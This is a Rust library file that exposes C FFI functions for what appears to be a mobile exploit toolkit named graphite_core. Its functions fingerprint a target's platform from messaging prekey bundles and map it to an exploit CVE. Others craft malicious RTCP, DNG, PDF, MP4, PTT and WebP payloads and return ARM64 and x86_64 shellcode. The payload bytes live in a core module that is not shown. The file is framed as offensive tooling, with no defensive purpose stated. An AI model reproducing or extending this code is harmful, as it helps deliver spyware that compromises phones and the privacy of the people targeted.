// lib.rs - FFI exports for graphite_core Rust library
// Compiled as cdylib for use from Python (ctypes), C, etc.

use std::os::raw::c_char;
use std::ffi::CStr;
use libc;

// Re-export from main module
mod core;
pub use core::*;

// FFI structs
#[repr(C)]
pub struct PrekeyBundleFFI {
    pub signed_pk_id: u32,
    pub otpk_ids: [u32; 10],
    pub otpk_count: i32,
    pub platform_hint: i32,
    pub ios_version: i32,
}

#[repr(C)]
pub struct FingerprintResultFFI {
    pub platform: i32,
    pub confidence: i32,
    pub exploit_cve: [u8; 32],
}

// FFI functions
#[unsafe(no_mangle)]
pub extern "C" fn graphite_fingerprint(bundle: *const PrekeyBundleFFI) -> FingerprintResultFFI {
    let b = unsafe { &*bundle };
    let prekey = PrekeyBundle {
        signed_pk_id: b.signed_pk_id,
        otpk_ids: b.otpk_ids[..b.otpk_count as usize].to_vec(),
        platform_hint: b.platform_hint,
        ios_version: b.ios_version,
    };
    let result = fingerprint(&prekey);
    let mut cve_bytes = [0u8; 32];
    for (i, b) in result.exploit_cve.bytes().enumerate() {
        if i < 32 { cve_bytes[i] = b; }
    }
    FingerprintResultFFI {
        platform: result.platform,
        confidence: result.confidence,
        exploit_cve: cve_bytes,
    }
}

#[unsafe(no_mangle)]
pub extern "C" fn graphite_craft_rtcp(buffer: *mut u8, buffer_size: usize, ssrc: u32) -> usize {
    let buf = unsafe { std::slice::from_raw_parts_mut(buffer, buffer_size) };
    let data = craft_rtcp(ssrc);
    let len = data.len().min(buffer_size);
    buf[..len].copy_from_slice(&data[..len]);
    len
}

#[unsafe(no_mangle)]
pub extern "C" fn graphite_craft_dng(buffer: *mut u8, buffer_size: usize) -> usize {
    let buf = unsafe { std::slice::from_raw_parts_mut(buffer, buffer_size) };
    let data = craft_dng();
    let len = data.len().min(buffer_size);
    buf[..len].copy_from_slice(&data[..len]);
    len
}

#[unsafe(no_mangle)]
pub extern "C" fn graphite_craft_pdf(buffer: *mut u8, buffer_size: usize) -> usize {
    let buf = unsafe { std::slice::from_raw_parts_mut(buffer, buffer_size) };
    let data = craft_pdf();
    let len = data.len().min(buffer_size);
    buf[..len].copy_from_slice(&data[..len]);
    len
}

#[unsafe(no_mangle)]
pub extern "C" fn graphite_craft_mp4(buffer: *mut u8, buffer_size: usize) -> usize {
    let buf = unsafe { std::slice::from_raw_parts_mut(buffer, buffer_size) };
    let data = craft_mp4();
    let len = data.len().min(buffer_size);
    buf[..len].copy_from_slice(&data[..len]);
    len
}

#[unsafe(no_mangle)]
pub extern "C" fn graphite_craft_ptt(buffer: *mut u8, buffer_size: usize) -> usize {
    let buf = unsafe { std::slice::from_raw_parts_mut(buffer, buffer_size) };
    let data = craft_ptt();
    let len = data.len().min(buffer_size);
    buf[..len].copy_from_slice(&data[..len]);
    len
}

#[unsafe(no_mangle)]
pub extern "C" fn graphite_craft_webp(buffer: *mut u8, buffer_size: usize) -> usize {
    let buf = unsafe { std::slice::from_raw_parts_mut(buffer, buffer_size) };
    let data = craft_webp();
    let len = data.len().min(buffer_size);
    buf[..len].copy_from_slice(&data[..len]);
    len
}

#[unsafe(no_mangle)]
pub extern "C" fn graphite_platform_name(platform: i32) -> *const c_char {
    let name = match platform {
        1 => "Android\0",
        2 => "iOS\0",
        _ => "Unknown\0",
    };
    name.as_ptr() as *const c_char
}

#[unsafe(no_mangle)]
pub extern "C" fn graphite_is_ios_range(signed_pk_id: u32) -> i32 {
    if signed_pk_id >= 0x800000 && signed_pk_id <= 0x9FFFFF { 1 } else { 0 }
}

#[unsafe(no_mangle)]
pub extern "C" fn graphite_shellcode_arm64(buffer: *mut u8, buffer_size: usize) -> usize {
    let buf = unsafe { std::slice::from_raw_parts_mut(buffer, buffer_size) };
    let data = shellcode_arm64();
    let len = data.len().min(buffer_size);
    buf[..len].copy_from_slice(&data[..len]);
    len
}

#[unsafe(no_mangle)]
pub extern "C" fn graphite_shellcode_x86_64(buffer: *mut u8, buffer_size: usize) -> usize {
    let buf = unsafe { std::slice::from_raw_parts_mut(buffer, buffer_size) };
    let data = shellcode_x86_64();
    let len = data.len().min(buffer_size);
    buf[..len].copy_from_slice(&data[..len]);
    len
}
